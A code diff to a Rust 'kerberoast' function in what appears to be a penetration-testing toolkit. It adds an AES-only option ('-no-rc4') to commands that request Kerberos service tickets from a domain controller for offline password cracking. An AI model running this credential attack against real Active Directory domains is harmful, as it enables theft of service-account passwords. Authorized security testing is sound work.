@@ -35,6 +35,8 @@ pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
 
     let target_pw = format!("{domain}/{username}:{password}");
 
+    let no_rc4 = crate::credentials::etype_hint_is_aes_only(args);
+
     // Preferred path: AES TGT via getTGT, then roast against the ccache so the
     // KDC will issue AES service tickets for AES-only accounts.
     if let Ok(dir) = tempfile::tempdir() {
@@ -56,6 +58,7 @@ pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
                 .arg("-no-pass")
                 .flag("-dc-ip", dc_ip)
                 .arg("-request")
+                .arg_if(no_rc4, "-no-rc4")
                 .env("KRB5CCNAME", ccache.to_string_lossy().to_string())
                 .timeout_secs(60)
                 .execute()
@@ -74,6 +77,7 @@ pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
         .arg(&target_pw)
         .flag("-dc-ip", dc_ip)
         .arg("-request")
+        .arg_if(no_rc4, "-no-rc4")
         .timeout_secs(60)
         .execute()
         .await;
